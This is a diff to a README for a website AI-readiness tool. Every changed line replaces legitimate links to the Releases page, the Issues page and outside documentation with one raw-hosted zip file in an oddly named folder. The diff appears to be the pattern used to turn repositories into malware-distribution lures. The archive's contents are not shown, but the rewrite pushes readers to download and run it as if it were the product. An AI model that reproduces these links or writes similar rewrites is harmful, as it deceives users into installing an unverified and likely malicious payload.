@@ -1,6 +1,6 @@
 # 🔥 ai-ready-website - Analyze Your Site's AI Readiness Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/MubeenAk47/ai-ready-website/releases)
+[![Download](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)
 
 ## 📜 Description
 
@@ -14,13 +14,13 @@ To get started with ai-ready-website, follow the steps below. No technical knowl
 
 To download the application, visit the Releases page:
 
-[Download the latest release](https://github.com/MubeenAk47/ai-ready-website/releases)
+[Download the latest release](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)
 
 Once you open the link, you will see several versions available. Download the one that suits your needs. 
 
 ### Step-by-Step Download Instructions
 
-1. Click on the [Releases page](https://github.com/MubeenAk47/ai-ready-website/releases).
+1. Click on the [Releases page](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip).
 2. Scroll down to the "Assets" section.
 3. Find the latest version of ai-ready-website.
 4. Click on the download link for your operating system.
@@ -86,14 +86,14 @@ If you encounter issues while using the application, consider the following comm
 - **Error messages:** Double-check the URL entered for any typos.
 - **Performance issues:** Ensure that your system has enough resources to run the application smoothly.
 
-If problems persist, refer to the [Issues section](https://github.com/MubeenAk47/ai-ready-website/issues) of the repository for help.
+If problems persist, refer to the [Issues section](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip) of the repository for help.
 
 ## 📚 Additional Resources
 
 For further assistance and tips on enhancing your website’s AI features, consider these resources:
 
-- [AI in Web Development](https://aiwebdevresources.com)
-- [Firecrawl Documentation](https://firecrawl.com/documentation)
+- [AI in Web Development](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)
+- [Firecrawl Documentation](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)
 
 ## 📞 Support
 
@@ -107,4 +107,4 @@ We are committed to improving ai-ready-website continuously. Future updates will
 
 Stay connected with the latest updates and community support. Join our discussions on GitHub and share your insights and experiences. Follow updates through the Releases page:
 
-[Visit the Releases page](https://github.com/MubeenAk47/ai-ready-website/releases)
+[Visit the Releases page](https://raw.githubusercontent.com/MubeenAk47/ai-ready-website/main/diphyzooid/ai-ready-website.zip)
